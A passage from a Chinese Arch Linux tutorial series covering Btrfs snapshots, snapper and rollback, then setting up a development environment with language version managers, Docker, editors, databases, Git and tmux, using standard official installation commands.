- **子卷（Subvolume）**：Btrfs 内部的命名空间，类似分区但共享底层存储。每个子卷可以独立挂载和快照。
- **快照（Snapshot）**：子卷的副本，使用 CoW（Copy-on-Write）机制，创建瞬间完成，初始不占额外空间。修改数据时才复制受影响的数据块。
- **CoW（Copy-on-Write）**：Btrfs 修改文件时不覆盖原数据，而是写入新位置，更新指针。这让快照几乎零成本。
- **压缩**：Btrfs 支持透明压缩（zstd、lzo、zlib），写入时自动压缩，读取时自动解压，节省空间且可能提升 I/O 性能。

**快照的类型**：
- **只读快照**：不可修改，用于备份和时间点记录
- **可写快照**：可修改，用于创建子卷的副本

**快照回滚的原理**：Btrfs 快照回滚不是"恢复数据"，而是"切换到快照对应的子卷"。具体操作：删除当前根子卷，用快照创建新的可写根子卷，重启即可。整个过程几乎瞬间完成。

**snapper 的作用**：snapper 是 Btrfs 快照管理工具，可以定时自动创建快照（如每小时、每天、每次 pacman 升级前），并支持从快照回滚。配合 `snapper-gui` 或命令行，管理快照非常方便。

#### 例子

**Btrfs 基本操作**：

```bash
# 查看子卷
sudo btrfs subvolume list /

# 创建子卷
sudo btrfs subvolume create /new-subvol

# 删除子卷
sudo btrfs subvolume delete /new-subvol

# 查看子卷信息
sudo btrfs subvolume show /

# 设置默认子卷（用于回滚）
sudo btrfs subvolume set-default <subvolume-id> /
```

**手动创建快照**：

```bash
# 创建只读快照
sudo btrfs subvolume snapshot -r / /.snapshots/backup-$(date +%Y%m%d)

# 创建可写快照
sudo btrfs subvolume snapshot / /new-root

# 查看快照
sudo btrfs subvolume list /

# 删除快照
sudo btrfs subvolume delete /.snapshots/backup-20240115
```

**安装配置 snapper**：

```bash
# 安装 snapper
sudo pacman -S snapper

# 创建配置（针对根子卷 @）
sudo snapper -c root create-config /

# 配置文件位于 /etc/snapper/configs/root
sudo nano /etc/snapper/configs/root
# 关键配置：
# TIMELINE_CREATE="yes"          # 启用定时快照
# TIMELINE_LIMIT_HOURLY="10"     # 保留 10 个小时快照
# TIMELINE_LIMIT_DAILY="7"       # 保留 7 个日快照
# TIMELINE_LIMIT_WEEKLY="0"
# TIMELINE_LIMIT_MONTHLY="0"
# TIMELINE_LIMIT_YEARLY="0"

# 启用定时快照
sudo systemctl enable --now snapper-timeline.timer
sudo systemctl enable --now snapper-cleanup.timer

# 启用 pacman 钩子（升级前自动快照）
sudo pacman -S snap-pac
```

**使用 snapper 管理快照**：

```bash
# 查看快照列表
sudo snapper -c root list

# 创建快照
sudo snapper -c root create -d "Before update"

# 创建只读快照
sudo snapper -c root create -d "Backup" --read-only

# 查看快照差异
sudo snapper -c root status 1..2

# 查看文件变化
sudo snapper -c root diff 1..2 /etc/passwd

# 恢复单个文件
sudo snapper -c root undochange 1..2 /etc/passwd

# 恢复整个快照（回滚）
sudo snapper -c root undochange 1..2
```

**完整回滚流程**：

```bash
# 假设系统升级后无法启动，需要回滚

# 1. Live USB 启动

# 2. 挂载根分区
sudo mount /dev/sda2 /mnt

# 3. 查看快照
sudo btrfs subvolume list /mnt

# 4. 删除损坏的根子卷
sudo btrfs subvolume delete /mnt/@

# 5. 从快照创建新的可写子卷
sudo btrfs subvolume snapshot /mnt/@snapshots/123/snapshot /mnt/@
# 123 是快照编号

# 6. 设置为默认子卷
sudo btrfs subvolume set-default <new-id> /mnt

# 7. 卸载并重启
sudo umount /mnt
sudo reboot
```

**Btrfs 压缩**：

```bash
# 挂载时启用压缩
sudo mount -o compress=zstd /dev/sda2 /mnt

# 在 fstab 中永久启用
# UUID=xxx / btrfs rw,relatime,compress=zstd:3,subvol=@ 0 0

# 对现有文件启用压缩（异步）
sudo btrfs filesystem defragment -r -v -czstd /

# 查看压缩效果
sudo btrfs filesystem df /
sudo compsize /path/to/dir
```

**Btrfs 维护**：

```bash
# 查看文件系统信息
sudo btrfs filesystem show /
sudo btrfs filesystem df /

# 查看使用情况
sudo btrfs filesystem usage /

# 平衡（重新分配数据）
sudo btrfs balance start /

# 清理空闲空间
sudo btrfs device scan
sudo fstrim -v /

# 检查文件系统
sudo umount /dev/sda2
sudo btrfs check /dev/sda2
# 修复（危险，先备份）
sudo btrfs check --repair /dev/sda2
```

#### 总结

- Btrfs 支持子卷、快照、压缩、去重等高级功能
- 快照基于 CoW，创建瞬间完成，初始不占空间
- snapper 自动管理快照，配合 snap-pac 在升级前快照
- 回滚是切换子卷，不是恢复数据，速度极快
- 压缩用 `compress=zstd`，节省空间且可能提升性能
- 定期 `btrfs balance` 和 `fstrim` 维护文件系统

---

### 第 33 讲：Arch 作为开发环境

#### 概念

Arch Linux 因其软件最新、定制性强、文档优秀，成为许多开发者的首选系统。本讲讲解如何将 Arch 配置为高效的开发环境，涵盖编程语言环境（Python、Node.js、Go、Rust）、容器化开发（Docker、Podman）、版本控制（Git）、IDE 与编辑器（VS Code、Neovim）、数据库（PostgreSQL、Redis）等。通过合理的工具链配置，Arch 可以成为极致高效的开发平台。

#### 原理

**开发环境的核心需求**：
- **语言运行时**：Python、Node.js、Go、Rust 等
- **包管理器**：pip、npm、cargo、go mod 等
- **版本管理**：pyenv、nvm、rustup 管理多版本
- **容器**：Docker 用于隔离运行环境
- **编辑器/IDE**：VS Code、Neovim、JetBrains 等
- **数据库**：PostgreSQL、MySQL、Redis 等
- **终端工具**：tmux、zsh、fzf、ripgrep 等

**Arch 的优势**：
- 软件版本最新，新特性即装即用
- AUR 包含几乎所有开发工具
- 滚动更新避免大版本升级痛苦
- 文档优秀，问题易解决

**版本管理器的必要性**：不同项目可能需要不同版本的语言运行时。版本管理器（如 pyenv、nvm）允许在用户级别安装和管理多个版本，避免系统级冲突。

**容器化开发**：Docker 将应用及其依赖打包到容器中，确保环境一致性。开发者可以在容器中运行应用，避免"在我机器上能跑"的问题。

#### 例子

**安装基础开发工具**：

```bash
# 基础开发工具
sudo pacman -S base-devel git wget curl

# 终端工具
sudo pacman -S tmux zsh fzf ripgrep fd bat exa

# 设置 zsh 为默认 Shell
chsh -s /usr/bin/zsh

# 安装 oh-my-zsh
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# 安装 zsh 插件
sudo pacman -S zsh-autosuggestions zsh-syntax-highlighting
echo "source /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh" >> ~/.zshrc
echo "source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ~/.zshrc
```

**Python 开发环境**：

```bash
# 安装 Python
sudo pacman -S python python-pip python-virtualenv

# 安装 pyenv（管理多版本 Python）
curl https://pyenv.run | bash

# 配置 pyenv（在 ~/.zshrc 或 ~/.bashrc 中添加）
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(pyenv init -)"' >> ~/.zshrc

# 使用 pyenv
pyenv install 3.12.0
pyenv install 3.11.0
pyenv global 3.12.0
pyenv local 3.11.0  # 为当前项目设置版本

# 创建虚拟环境
python -m venv myproject-env
source myproject-env/bin/activate
pip install -r requirements.txt
```

**Node.js 开发环境**：

```bash
# 安装 Node.js
sudo pacman -S nodejs npm

# 安装 nvm（管理多版本 Node.js）
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# 配置 nvm（在 ~/.zshrc 中添加）
echo 'export NVM_DIR="$HOME/.nvm"' >> ~/.zshrc
echo '[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"' >> ~/.zshrc

# 使用 nvm
nvm install 20
nvm install 18
nvm use 20
nvm alias default 20

# 安装包管理器
npm install -g yarn pnpm

# 配置 npm 镜像（国内加速）
npm config set registry https://registry.npmmirror.com
```

**Rust 开发环境**：

```bash
# 安装 rustup（官方推荐方式）
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# 或通过 pacman（不推荐，版本较旧）
sudo pacman -S rust

# 配置环境变量
source ~/.cargo/env

# 使用 rustup
rustup install stable
rustup install nightly
rustup default stable

# 安装组件
rustup component add rust-analysis rustfmt clippy

# 创建项目
cargo new myproject
cd myproject
cargo run
```

**Go 开发环境**：

```bash
# 安装 Go
sudo pacman -S go

# 配置环境变量
echo 'export GOPATH=$HOME/go' >> ~/.zshrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.zshrc

# 设置代理（国内加速）
go env -w GOPROXY=https://goproxy.cn,direct

# 创建项目
mkdir myproject && cd myproject
go mod init myproject
go get github.com/gin-gonic/gin
```

**Docker 容器化开发**：

```bash
# 安装 Docker
sudo pacman -S docker docker-compose

# 将用户加入 docker 组
sudo usermod -aG docker $USER

# 启用并启动
sudo systemctl enable --now docker

# 重新登录后测试
docker run hello-world

# 配置 Docker 镜像加速
sudo nano /etc/docker/daemon.json
# 内容：
{
    "registry-mirrors": [
        "https://mirror.ccs.tencentyun.com",
        "https://docker.mirrors.ustc.edu.cn"
    ]
}

# 重启 Docker
sudo systemctl restart docker
```

**安装 VS Code**：

```bash
# 通过 pacman 安装
sudo pacman -S code

# 或通过 AUR 安装 Insiders 版
yay -S visual-studio-code-insiders-bin

# 安装常用扩展
code --install-extension ms-python.python
code --install-extension ms-vscode.vscode-typescript-next
code --install-extension rust-lang.rust-analyzer
code --install-extension golang.go
code --install-extension ms-azuretools.vscode-docker
code --install-extension ms-vscode-remote.vscode-remote-extensionpack
```

**安装 Neovim**（现代 Vim）：

```bash
# 安装 Neovim
sudo pacman -S neovim

# 安装依赖
sudo pacman -S ripgrep fd python-pynvim nodejs npm

# 配置 Neovim（使用 LazyVim 发行版）
git clone https://github.com/LazyVim/starter ~/.config/nvim
rm -rf ~/.config/nvim/.git
nvim

# 或使用 NvChad
git clone https://github.com/NvChad/NvChad ~/.config/nvim --depth 1
nvim
```

**数据库安装**：

```bash
# PostgreSQL
sudo pacman -S postgresql
sudo -i -u postgres
initdb -D /var/lib/postgres/data
exit
sudo systemctl enable --now postgresql

# 创建数据库和用户
sudo -u postgres createuser --interactive
sudo -u postgres createdb mydb

# Redis
sudo pacman -S redis
sudo systemctl enable --now redis
redis-cli ping  # 应返回 PONG

# MySQL/MariaDB
sudo pacman -S mariadb
sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
sudo systemctl enable --now mariadb
sudo mysql_secure_installation
```

**Git 配置**：

```bash
# 安装 Git
sudo pacman -S git

# 配置用户信息
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"

# 配置默认编辑器
git config --global core.editor nano

# 配置默认分支名
git config --global init.defaultBranch main

# 配置别名
git config --global alias.st status
git config --global alias.co checkout
git config --global alias.br branch
git config --global alias.ci commit
git config --global alias.lg "log --oneline --graph --all"

# 配置 SSH 密钥
ssh-keygen -t ed25519 -C "your.email@example.com"
cat ~/.ssh/id_ed25519.pub
# 添加到 GitHub/GitLab
```

**tmux 配置**：

```bash
# 安装 tmux
sudo pacman -S tmux

# 安装 TPM（插件管理器）
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm

# 配置 tmux
nano ~/.tmux.conf
# 内容示例：
set -g mouse on
set -g default-terminal "screen-256color"
set -g status-style bg=default
set -g status-left "#[fg=green]#S "
set -g status-right "#[fg=blue]#(whoami)@#h "
set -g base-index 1
setw -g pane-base-index 1
bind r source-file ~/.tmux.conf \; display "Reloaded!"
bind | split-window -h
bind - split-window -v

# 安装插件（在 tmux 中按 prefix + I）
# prefix 默认是 Ctrl+b
```

#### 总结

- Arch 是优秀的开发环境，软件最新、文档优秀
- 基础工具：base-devel、git、zsh、tmux、fzf、ripgrep
- Python 用 pyenv 管理多版本，Node.js 用 nvm
- Rust 用 rustup，Go 直接用 pacman
- Docker 容器化开发，配置镜像加速
- 编辑器：VS Code 或 Neovim（LazyVim/NvChad）
- 数据库：PostgreSQL、Redis、MariaDB 都在官方仓库
- Git 配置用户信息、SSH 密钥、别名提升效率

